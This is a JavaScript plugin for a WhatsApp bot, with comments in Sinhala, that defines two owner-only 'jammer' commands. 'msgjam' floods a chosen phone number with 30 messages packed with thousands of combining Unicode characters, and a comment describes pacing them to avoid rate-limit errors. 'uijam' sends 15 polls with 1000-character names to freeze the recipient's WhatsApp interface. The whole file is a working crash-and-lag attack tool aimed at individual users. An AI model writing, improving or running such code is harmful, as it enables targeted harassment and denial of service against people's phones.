const { cmd } = require('../command');

// --- COMMON FUNCTION FOR DELAY ---
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

cmd({
    pattern: "msgjam",
    alias: ["lag2", "slow2"],
    desc: "Infinite Loop Jammer for Railway",
    category: "owner",
    react: "⏳",
    filename: __filename
},
async (conn, mek, m, { from, isOwner, reply, args, senderNumber }) => {
    try {
        const authorizedNumbers = ['94740137623']; // ඔයාගේ අංකය
        if (!authorizedNumbers.includes(senderNumber) && !isOwner) return;
        if (!args[0] && !m.quoted) return reply("අංකයක් දෙන්න! ❌");

        let target = m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

        reply("🚀 *Railway Processing:* Msg-Jammer Started...");

        // 1. Loop Attack: මෙය මැසේජ් 30ක් විතර යවනවා, හැබැයි එක මැසේජ් එකක් බර අඩුයි
        // ඒ නිසා Railway එකෙන් 428 Error එක එවන්නේ නැහැ.
        for (let i = 0; i < 30; i++) {
            const jamPayload = `*⚠️ SYSTEM LAG ⚠️*\n` + " \u0345\u0361\u0345".repeat(2000);

            await conn.sendMessage(target, { 
                text: jamPayload,
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    // adReply එක නිසා processing power එක වැඩියෙන් යනවා
                    externalAdReply: {
                        title: "H A S H U - J A M",
                        body: "Processing Data...",
                        mediaType: 1,
                        thumbnailUrl: `https://files.catbox.moe/vbo0vq.png`,
                        renderLargerThumbnail: false
                    }
                }
            });
            await delay(800); // පොඩි ඩිලේ එකක් Error වළක්වන්න
        }
        reply("✅ Jamming Cycle Completed!");
    } catch (e) { console.log(e) }
});

cmd({
    pattern: "uijam",
    desc: "Lag the whole WhatsApp UI",
    category: "owner",
    react: "🥶",
    filename: __filename
},
async (conn, mek, m, { from, isOwner, reply, args, senderNumber }) => {
    try {
        const authorizedNumbers = ['94740137623']; 
        if (!authorizedNumbers.includes(senderNumber) && !isOwner) return;
        let target = m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

        reply("🚀 *UI-Jammer:* Freezing Keyboard and UI...");

        // 2. Poll/Button Jammer: WhatsApp එකේ Buttons සහ Polls රෙන්ඩර් කිරීම ඉතාම බර වැඩක්
        for (let i = 0; i < 15; i++) {
            await conn.sendMessage(target, {
                poll: {
                    name: "҉".repeat(1000),
                    values: ["Lag 1", "Lag 2", "Lag 3", "Lag 4"],
                    selectableCount: 1
                }
            });
            await delay(1000);
        }
        reply("✅ UI Jamming Finished!");
    } catch (e) { console.log(e) }
});
